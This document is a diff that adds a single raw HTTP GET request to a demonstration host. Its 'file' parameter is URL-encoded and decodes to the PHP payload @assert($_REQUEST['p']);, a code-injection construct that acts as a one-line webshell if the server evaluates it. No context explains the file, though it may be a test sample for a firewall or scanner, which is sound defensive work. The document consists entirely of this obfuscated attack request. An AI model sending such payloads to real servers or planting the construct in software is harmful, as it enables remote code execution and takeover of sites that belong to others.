@@ -1,0 +1,4 @@
+GET /a?file=%40%61%73%73%65%72%74%28%24%5F%52%45%51%55%45%53%54%5B%27%70%27%5D%29%3B HTTP/1.1
+Host: demo.example.com
+Connection: close
+
